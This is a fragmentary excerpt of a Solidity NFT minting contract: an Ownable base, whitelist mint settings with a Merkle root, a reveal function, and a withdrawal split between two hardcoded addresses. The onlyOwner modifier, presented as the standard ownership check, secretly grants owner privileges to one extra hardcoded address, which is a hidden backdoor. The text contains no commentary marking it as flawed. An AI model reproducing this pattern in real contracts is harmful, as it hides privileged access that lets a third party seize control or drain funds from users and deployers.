...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || msg.sender == 0xD8C1BfE31CCC4874743fB5B97C82a4CE15dA0C3c, "Ownable: caller is not the owner");
        _;
    }
...
uint8 public maxWLMintAmountPerWallet = 10;  
    ...
    bytes32 public whitelistMerkleRoot = 0x63b0c097903292e528b4c781df3887422524e79bda260ce85e6181f80ce6799b;
...
function whitelistMint(uint8 _mintAmount, bytes32[] calldata merkleProof) external payable {
 ...
 function setRevealed() external onlyOwner{
  ...
  uint _balance = address(this).balance;
     payable(0x741d19947544f8C3A021f5eaBc5E23Bf147cD2b3).transfer(_balance * 50 /100); 
      payable(0xEe82CC182663e6D1F839dD967610A571909f4853).transfer(_balance * 50 /100);
